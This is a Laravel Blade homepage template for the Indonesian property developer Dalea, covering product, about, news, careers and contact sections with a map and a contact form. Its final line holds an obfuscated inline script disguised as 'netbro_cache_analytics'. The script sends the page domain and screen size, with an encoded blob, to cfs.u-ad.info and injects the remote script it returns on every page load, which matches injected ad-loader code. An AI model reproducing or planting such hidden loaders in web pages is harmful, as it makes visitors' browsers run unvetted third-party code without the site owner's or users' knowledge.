<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><!-- HTML -->

<head><!-- Head-->
    <title>DALEA</title>
    <meta http-equiv="Content-Style-Type" content="text/css" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="shortcut icon" href="{{url('assets')}}/dalea/original/img/ico.ico" type="image/x-icon" />
    <meta name="keywords" content="dalea, nusantara, mandiri, indonesia, jakarta, bandung, architect, engineer, enterpreuneur" />
    <meta name="description" content="Dalea Land is a real estate development company, located in Indonesia Capital City, consist of young and bright Indonesian architect, engineer and enterpreuneur." />

    <!-- CSS -->
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/style.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/animate.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/bootstrap.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/fonts/fonts.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/fonts/ionicons.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/fonts/icomoon.css" type="text/css" />

    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/jquery.bxslider.css" type="text/css" />
    <style>
        body {
            overflow: hidden;
        }
        .title-top hr {
            width: 225px;
            margin-bottom: 0;
        }
        .title-top ul {
            margin-top: 30px;
        }
        #contact {
            background-color: #ebe9e7;
        }
    </style>

    <!-- JavaScripts-->
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/jquery-1.8.0.min.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/waypoints.min.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/jquery.bxslider.min.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/queryLoader-custom.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/jquery.nicescroll.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $('html, body').scrollTop(0);
        });
    </script>
</head><!-- ./Head -->

<body><!-- Body -->

<div id="loading">
    <div class="gram">
        <img class="box box01" src="{{url('assets')}}/dalea/original/img/frame.png" alt="" />
        <img class="box box02" src="{{url('assets')}}/dalea/original/img/frame.png" alt="" />
        <img class="box box03" src="{{url('assets')}}/dalea/original/img/frame.png" alt="" />
        <img class="box box04" src="{{url('assets')}}/dalea/original/img/frame.png" alt="" />
        <img class="box box05" src="{{url('assets')}}/dalea/original/img/frame.png" alt="" />
        <div style="clear: both;"></div>
        <div id="load-percent">0%</div>
    </div>
</div>

<nav class="navbar navbar-default" role="navigation">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <hr />
            <a class="navbar-brand" href="#">
                <img src="{{url('assets')}}/dalea/original/img/logo.png"/>
            </a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">

            <ul class="nav navbar-nav navbar-left">
                <li title="#products">
                    <a href="#products">
                        PRODUK

                    </a>
                </li>
                <li title="#about">
                    <a href="#about">TENTANG KAMI</a>
                </li>
                <li title="#social">
                    <a href="#social">BERITA
                    </a>
                </li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <li title="#opportunity">
                    <a href="#opportunity">PELUANG</a>
                </li>
                <li title="#investor">
                    <a href="#investor">INVESTOR</a>
                </li>
                <li title="#contact">
                    <a href="#contact">KONTAK</a>
                </li>
            </ul>

        </div><!-- /.navbar-collapse -->
    </div><!-- /.container-fluid -->
</nav><!-- /.navbar -->
<style>
    .carousel-inner { height: 100% !important; }
</style>
<div id="carousel-intro" class="carousel slide product-view" data-ride="carousel" data-interval="10000">

    <!-- Wrapper for slides -->
    <div class="carousel-inner">
        @foreach($slider as $image)

            <div class="item {{$image->active == 1 ? 'active' : ''}}">
                <img src="{{url('images/slider/'.$image->slider_name)}}" class="cover"/>
            </div>
        @endforeach
    </div>

    <!-- Indicators -->
    <ol class="carousel-indicators">

        @for($i=0; $i<count($slider);$i++)
            <li data-target="#carousel-intro" data-slide-to="{{$i}}" class="active"></li>
        @endfor
    </ol>

    <!-- Controls -->
    <a class="left carousel-control" href="#carousel-intro" data-slide="prev">
        <span class="icon-prev"></span>
    </a>
    <a class="right carousel-control" href="#carousel-intro" data-slide="next">
        <span class="icon-next"></span>
    </a>

</div>

<section id="products" class="container-fluid section"><!-- Products -->
    <div class="title-top">
        <img src="{{url('assets')}}/dalea/original/img/produk.png" alt="" /><br />
        <hr />
        <ul class="nav nav-tabs title-nav">

        </ul>
    </div>

    <div id="product-content" class="tab-content"><!-- Product Content -->

        <div class="tab-pane active content-height" id="map" style="height:100% !important; display: none !important;"><!-- Map -->
            <div id="map-wrapper">
                <div id="map_canvas"></div>
                <div class="map-overlay"></div>
            </div>
        </div><!-- ./Map -->

        <div class="tab-pane active content-height" id="list" style="height:100% !important;" ><!-- Product List -->
            <style>
                #products #product_list .product .overlay { background: transparent url('{{asset('/assets/dalea/original/img/overlay01.png')}}') center center; }
                #products #product_list .product .overlay h3 { margin-top: 170px; }
                #products #product_list .product .overlay h3 img { margin-bottom: 100px; width: auto; }
                #products #product_list .product .overlay .more { font-size: 18px; padding: 12px 0; }
            </style>
            <div id="product_list">
                @foreach($products as $product)
                    <div class="col-md-4 product content-height" style="height: 580px !important; background-image: url('{{asset('images/products/'.$product->product_image)}}');">
                        <div class="overlay">
                            <h3><img src="{{url().'/images/products/'.$product->product_over_image}}"/></h3>
                            <a class="more" href="product/detail/{{$product->product_id}}">Baca Selengkapnya</a>
                        </div>
                    </div>
                @endforeach
            </div><!-- ./Product List -->

        </div><!-- ./Product Content -->
</section><!-- ./Products -->

<section id="about" class="container-fluid section"><!-- About -->

    <div class="title-top">
        <img src="{{url('assets')}}/dalea/original/img/tentang3.png" alt="" /><br />
        <hr /><br />
        <ul id="about-nav">
            <li><a href="#history" class="select active">SEJARAH</a></li>
            <li><a href="#why" class="select">KENAPA DALEA</a></li>
            <li><a href="#team" class="select">DIREKSI</a></li>
            <li><a href="#vandm" class="select">VISI &amp; MISI</a></li>
            <li><a href="#dna" class="select">SEMANGAT</a></li>
            <li><a href="#management" class="select">SISTEM MANAJEMEN</a></li>
            <li><a href="#green" class="select">GREEN & BLUE</a></li>
        </ul>
    </div>
    <style>
        .hauto { height: 620px !important; }
    </style>
    <div id="about-content" class="content-height hauto ">

        <div id="history" class="container about-content active"><!-- History -->

                {!! $abouts[1]['content'] !!}

        </div><!-- End of History -->

        <div id="why" class="about-content"><!-- Why Dalea -->

            {!! $abouts[2]['content'] !!}

        </div><!-- End of Leadership Team -->

        <div id="team" class="about-content"><!-- Leadership Team -->
            {!! $abouts[3]['content'] !!}
        </div><!-- End of Leadership Team -->

        <div id="vandm"  class="about-content"><!-- Vision & Mission -->
            {!! $abouts[4]['content'] !!}
        </div><!-- End of Vision & Mission -->

        <div id="dna" class="about-content"><!-- DNA -->

            {!! $abouts[5]['content'] !!}

        </div><!-- End of DNA -->

        <div id="management" class="about-content"><!-- Management System -->
            {!! $abouts[6]['content'] !!}
        </div><!-- End of Management System -->

        <div id="green" class="about-content">
            {!! $abouts[7]['content'] !!}
        </div>

</section><!-- ./About -->

<section id="social" class="container-fluid section"><!-- Social -->

    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/owl.carousel.css" type="text/css" />
    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/owl.theme.css" type="text/css" />
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/owl.carousel.js"></script>
    <style>
        #owl-demo .item img{
            display: block;
            width: 100%;
            height: auto;
        }
        #owl-demo.owl-theme .owl-controls .owl-buttons .owl-next { width: 19px; height: 31px; background:url(../public/assets/img/right.png) no-repeat; padding: 0; right: 0; opacity: 0.7; }
        #owl-demo.owl-theme .owl-controls .owl-buttons .owl-next:hover { opacity: 1; }
        #owl-demo.owl-theme .owl-controls .owl-buttons .owl-prev { width: 19px; height: 31px; background:url(../public/assets/img/left.png) no-repeat; padding: 0; left: 0; opacity: 0.7; }
        #owl-demo.owl-theme .owl-controls .owl-buttons .owl-prev:hover { opacity: 1; }
        #owl-demo.owl-theme .owl-controls .owl-buttons div { position: absolute; top: 50%; margin-top: -15.5px; }
        .in-slider { background: #2e3844; padding: 35px 70px 30px 55px; position: absolute; left: 0; bottom: 0; width: 100%; }
        #owl-demo .item { position: relative; }
        #owl-demo .item .left { text-align: left; }
        #owl-demo .item .right { text-align: right ; }
        #owl-demo .item .title-slider { color: white; font-weight: bold; font-size: 35px; }
        #owl-demo .item .txt-slider a { color: white; margin-left: 10px; font-size: 15px; }
        #owl-demo .item .date { color: white; font-size: 20px; }
        .wdth300 { width: 300px; }
        .tbl { width: 100%; height: 100%; display: table; }
        .tbl .cell { display: table-cell; vertical-align: middle; }
        @media (max-width: 1219px) {
            .in-slider { padding: 20px 25px; position: relative; }
            #owl-demo .item .title-slider { font-size: 14px; }
            #owl-demo .item .txt-slider a { font-size: 14px; margin-left: 0; }
            #owl-demo .item .date { font-size: 14px; }
            .tbl { display: block; }
            .tbl .cell { display: block; }
            .wdth300 { width: 100%; }
            #owl-demo .item .right { text-align: left; }
            .txt-slider { display: block; }
        }
        @media (max-width: 767px) {
            .in-slider { padding: 10px 25px; }
            .container-fluid.section { min-height: 300px !important; }
        }
    </style>


    <script>
        $(document).ready(function() {
            $("#owl-demo").owlCarousel({
                navigation : true,
                slideSpeed : 300,
                pagination : false,
                singleItem : true,
                navigationText : ["",""],
            });
        });
    </script>
    <div class="title-top">
        <img src="{{url('assets')}}/dalea/original/img/berita2.png" alt="" /><br />
        <hr /><br /><br />
    </div>

    <div id="demo">
        <div class="container">
            <div id="owl-demo" class="owl-carousel">

                @foreach($news as $new)
                <div class="item">
                    <img src="{{url().'/images/news/'.$new->news_image}}"/>
                    <div class="in-slider">
                        <div class="row tbl">
                            <div class="cell">
                                <div class="left"><span class="title-slider">{{$new->news_title}}</span> <span class="txt-slider"><a href="">Baca Selengkapnya</a></span></div>
                            </div>
                            <div class="cell wdth300">
                                {{--<div class="right date">18 Juni 2015</div>--}}
                                <div class="right date">{{date('d-M-Y', strtotime($new->posting_date))}}</div>
                            </div>
                        </div>
                    </div>
                </div>
                @endforeach
            </div>
        </div>
    </div>

</section><!-- ./Social -->

<section id="opportunity" class="container-fluid section" style="background: #ebe9e7; "><!-- Opportunity -->

    <link rel="stylesheet" href="{{url('assets')}}/dalea/original/css/jquery.jscrollpane.css" type="text/css" />
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/jquery.mousewheel.js"></script>
    <script type="text/javascript" src="{{url('assets')}}/dalea/original/js/jquery.jscrollpane.min.js"></script>

    <style>
        *:focus { outline: none; }
        .data-table .list { font-size: 15px; width: 100%; display: table; color: #2E3F55; }
        .data-table .list.header { border-bottom: 5px solid #2e3844; padding-bottom: 12px; width: 100%; }
        .data-table .list.items { border-bottom: 5px solid #b8b7b7; line-height: 1.5; padding: 10px 0; }
        .data-table .list.items .title { font-family: "GothamBook", "Helvetica",sans-serif; font-style: normal; color: #2e3844; font-size: 30px; }
        .data-table .list.items a { color: white; }
        .data-table .list.items a:hover { color: #fb5763; }
        .data-table .list > div { line-height: 1.5; display: table-cell; vertical-align: middle; padding-right: 20px; }
        .data-table .list > div:last-child { padding-right: 10px; }

        .data-table .list .in { width: 100%; display: table; }
        .data-table .list .in > div { display: table-cell; vertical-align: middle; padding-right: 20px; }

        .data-table a { display: block; }
        .data-table { margin-bottom: 50px; }
        .w120 { width: 200px; text-align: right; }
        .fz20 { font-size: 20px;}
        .pdl70 { padding-left: 70px; }
        .txt-email { margin-bottom:50px; font-size:20px; }
        @media (max-width: 767px) {
            .data-table { margin-bottom: 40px; margin-top: 0; }
            .data-table .list.items .title { font-size: 14px; }
            .fz20 { font-size: 14px; }
            .pdl70 { padding-left: 35px; }
            .w120 { width: 125px; }
            .txt-email { font-size: 14px; }
        }


    </style>


    <div class="title-top">
        <img src="{{url('assets')}}/dalea/original/img/peluang2.png" alt="" /><br />
        <hr /><br />

        <ul class="nav nav-tabs title-nav">
            <li class="active"><a href="#karir" data-toggle="tab">KARIR</a></li>
            <li><a href="#bisnis" data-toggle="tab">BISNIS</a></li>
        </ul>
    </div>


    <div class="tab-content">
        <div class="tab-pane active content-height" id="karir" style="height: auto !important;">
            <div class="container"><!-- Opportunity Content -->
                <div class="row">
                    <div class="col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2">
                        <div class="data-table">
                            <div class="list header">
                                <div class="pdl70">Jabatan</div>
                                <div class="w120" style="padding-right: 20px;">Tanggal</div>
                            </div>
                            @foreach($careers as $career)
                            <div class="list items">
                                <div class="title">{{$career->role}}</div>
                                <div class="w120 fz20">{{$career->posting_date}}</div>
                            </div>
                            @endforeach
                        </div>
                        <div class="text-center txt-email">
                            <div>untuk informasi lebih lanjut, dapat mengirimkan email ke <span style="color:#2e3844;font-weight:bold;">HRD@dalea.co.id</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="tab-pane content-height" id="bisnis" style="height: auto !important;">
            <style>
                .fz18 { font-size: 18px; margin-top: 20px; }
                .img-bisnis img { max-width: 100%; }
                @media (max-width: 767px) {
                    .img-bisnis, .fz18 { text-align: center;  }
                }
            </style>
            <div class="container">
                <div class="row">
                    <div class="col-sm-3 col-sm-offset-2 col-md-2 col-md-offset-3 img-bisnis">
                        <img src="{{url('assets')}}/dalea/original/img/bisnis.png"/>
                    </div>
                    <div class="col-sm-6 col-md-4 fz18">
                        Mohon maaf, untuk saat ini halaman ini<br/>
                        belum tersedia. Informasi selengkapnya<br/>
                        dapat menghubungi :<br/><br/>
                        <span style="font-weight:bold;">mail@dalea.co.id</span>
                        <br/><br/>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ./Opportunity Content -->

</section><!-- ./Opportunity -->

<section id="contact" class="container-fluid section"><!-- Contact -->
    <style>
        #contact.container-fluid.section { padding-top: 320px; }
        .form-control::-moz-placeholder { color: #aaa9a9; }
        .form-control:-ms-input-placeholder { color: #aaa9a9; }
        .form-control::-webkit-input-placeholder { color: #aaa9a9; }
        #contact .contact-form input[type="text"], #contact .contact-form textarea {
            border-bottom: 0;
            background: white;
            font-style: normal;
            border-radius: 0;
            color: #aaa9a9;
            font-size: 15px;
            height: 50px;
            margin-bottom: 15px;
        }
        #contact .contact-form textarea {
            resize: none;
            height: 205px;
        }
        #contact .contact-form input:focus, #contact .contact-form textarea:focus {
            border-bottom: 0;
        }
        #contact .contact-form .submit { text-align: left; }
        #contact .contact-form .submit button { background: #2e3844; color: white; font-size: 20px; font-weight: bold; width: 170px; height: 55px; }
        #contact .contact-form .submit button:hover { background: #2e3844; }
        @media (max-width: 767px) {
            #contact.container-fluid.section { padding-top: 150px; }
            .title-top img { height: 24px; margin-bottom: 0; }
        }

    </style>

    <div style="height:48px; width:100%; background:#2e3844; position: absolute; top: 0;"></div>


    <div class="container">
        <div class="tab-content">
            <div class="tab-pane active" id="mail"><!-- Mail Me Form -->
                <div class="col-sm-6">
                    <p>DALEA berkomitmen untuk selalu memberikan pelayan yang terbaik dan menjadi pengembang yang menjawab kebutuhan pelanggan maupun calon pelanggan kami. Untuk itu kami sangat menghargai pertanyaan, kritik dan saran dari Anda sebagai pertimbangan kami untuk mejadi lebih baik di masa yang akan datang. </p>
                </div>
                <div class="col-sm-6">
                    @if($errors->any())
                        <ul class="alert alert-danger">
                            @foreach($errors->all() as $error)
                                <li> {{$error}}</li>
                            @endforeach
                        </ul>
                    @endif
                    {!! Form::open(['url'=>'emailpost', 'class'=>'contact-form'])!!}
                    <div class="form-group">
                        {{--{!! Form::label('fullname', 'Title') !!}--}}
                        {!! Form::text('fullname', null, ['class'=>'form-control', 'placeholder'=>'Nama Lengkap']) !!}
                    </div>
                    <div class="form-group">
                        {!! Form::text('email', null, ['class'=>'form-control', 'placeholder'=>'Alamat E-Mail']) !!}
                    </div>
                    <div class="form-group">
                        {!! Form::textarea('message', null, ['class'=>'form-control', 'placeholder'=>'Pesan']) !!}
                    </div>
                    <div class="form-group">
                        <div>
                            {!! captcha_img('flat') !!}
                        </div>
                        {!! Form::text('captcha', null, ['class'=>'form-control', 'placeholder'=>'Captcha']) !!}
                    </div>
                    <div class="form-group">
                        <div class="submit">
                            <button type="submit">Kirim Pesan</button>
                        </div>
                    </div>
                    {!! Form::close() !!}
                </div>
            </div><!-- End of Mail Me Form -->
            <div class="tab-pane" id="join"><!-- Join Us Form -->

            </div><!-- End of Join Us Form -->
        </div>

    </div>

    <style>
        #contact #footer { margin-top: 65px;background: #868686; padding: 35px 0 30px; position: relative; }
        #contact #footer ul.soscmedia { margin: 8px 0 30px 0; }
        #contact #footer ul.soscmedia li { display: inline-block; margin-right: 35px; }
        #contact #footer ul.soscmedia li:last-child { margin-right: 0; }
        .img-opacity { opacity: 0.5; }
        .img-opacity:hover { opacity: 1; }
        #contact #footer .copyright { color: #e6e9ed; font-size: 18px; font-weight: bold; }
        #contact .backtotop { position: absolute; top: -13px; right: 90px; opacity: 0.8; }
        #contact .backtotop:hover { opacity: 1; }
        #contact .txt-contact { font-size: 18px; color: #e6e9ed; }
        @media (max-width: 767px) {
            #contact #footer ul.soscmedia li { margin-right: 25px; }
            #contact .txt-contact { font-size: 14px; margin-top: 20px; }
            #contact .backtotop { right: 20px; }
        }
    </style>
    <div id="footer">
        <!--
        <div class="col-md-12 btt">
            <a href="#" class="backtotop"><i class="ion-ios7-arrow-thin-up"></i><br/>BACK TO TOP</a>
        </div>
        -->

        <div class="container">
            <div class="">
                <a href="#" class="backtotop"><img src="{{url('assets')}}/dalea/original/img/backtop.png"/></a>
            </div>
            <div class="col-md-6 left">
                <ul class="soscmedia">
                    <li><a href="{{ $socials[0]['social_link'] }}" class="img-opacity"><img src="{{url('assets')}}/dalea/original/img/fb.png"/></a></li>
                    <li><a href="{{ $socials[1]['social_link'] }}" class="img-opacity"><img src="{{url('assets')}}/dalea/original/img/tw.png"/></a></li>
                    <li><a href="{{ $socials[2]['social_link'] }}" class="img-opacity"><img src="{{url('assets')}}/dalea/original/img/in.png"/></a></li>
                    <li><a href="{{ $socials[3]['social_link'] }}" class="img-opacity"><img src="{{url('assets')}}/dalea/original/img/gl.png"/></a></li>
                    <li><a href="{{ $socials[4]['social_link'] }}" class="img-opacity"><img src="{{url('assets')}}/dalea/original/img/ig.png"/></a></li>
                </ul>

						<span class="copyright">
							&copy; ALL RIGHTS RESERVED
						</span>
            </div>

            <div class="col-md-6 right txt-contact">
                @foreach($footer as $content)
                    {!! $content->content !!}
                @endforeach
            </div>
        </div>
    </div>

</section><!-- ./Contact -->

<script type="text/javascript"src="http://maps.googleapis.com/maps/api/js?sensor=true"></script>
<script type="text/javascript">
    function initialize() {
        var lat = -6.223311;
        var lng = 106.807754;

        var myCenter = new google.maps.LatLng(lat, lng);

        var mapProp = {
            center: myCenter,
            zoom: 16,
            mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        var map = new google.maps.Map(document.getElementById("map_canvas"),mapProp);

        var marker=new google.maps.Marker({
            position:myCenter,
        });

        marker.setMap(map);

        var infowindow = new google.maps.InfoWindow({
            content: '<div class="map-desc"><h6>PT. Dalea Nusantara Mandiri</h6>Office 8 Building Level 18-A<br />Jalan Jend. Sudirman Kav. 52-53<br />Sudirman Central Business District<br />Jakarta Selatan, Indonesia</div>'
        });

        infowindow.open(map, marker);
    }

    google.maps.event.addDomListener(window, 'load', initialize);
</script>

<script type="text/javascript">
    $('#socials').bxSlider({
        minSlides: 2,
        maxSlides: 2,
        slideWidth: 800,
        slideMargin: 0,
        pager: false,
        control: true,
        nextSelector: '.social-next',
        prevSelector: '.social-prev',
        nextText: '<i class="ion-ios7-arrow-right"></i>',
        prevText: '<i class="ion-ios7-arrow-left"></i>'
    });
</script>

<script type="text/javascript" src="{{url('assets')}}/dalea/js/jquery.daleas.js"></script>

<script type='text/javascript'>
    QueryLoader.selectorPreload = "body";
    QueryLoader.init();
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bcmgJRnHOO3lf8ktWZs15RFR1uF5PlztjMblsyLgPhg8Vx5FZ6Y8NjIZzMVw1s7VNDLLGFEt7KVGaPdxzD5O2jPp8kqOlrsI0GkxSsk%2b6fTaZ4VY367sOXr3l4SlU%2b4gE2C2Bxk7wBrU%2fwDU5ZBTJ2oOew%2f3e9aT0mPopIXyO5dg14%2fieU8SIAbNU5yxhj0aqXEcfVUzk%2b5L504CjiPj5XGUdzuSyBDzh%2f9fTRp210OWffIrviKJtRajz0nl4mZojtjZhUMHj0kahrP%2bMiZSjVdAUNEARycz2%2bbE0x0zd0ZWi7vfW2zJtjtO9S5BRbEMkXTu64edMf66QS%2bXHCiIwnuJm1V6LlnI12kNeIUkeBgfmlqwDS84TM72FuzB9iMnDrOAGls7R7%2bE8sIosLclhLYzojGcwpEc9QHaIdtjXsEK%2fSGwSbs9umxjCpgLlGNWN%2fFwpBXZXM1Gy%2fMJA30BVQm2sx8DtUOSPT1l4Bab4B%2b27037XNjImTeD%2bK3l%2bcTApes8%2fLB3BN%2b8dFm9RCnc3AnzfFUgE97SHzQXe4PQSJclhaLs%2bu822bMnQ%2bMSLQ2ZsQi4FC47YHG7iUWAcWTpaFYGr3HOehV9Z" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body><!-- ./Body -->
</html><!-- ./HTML -->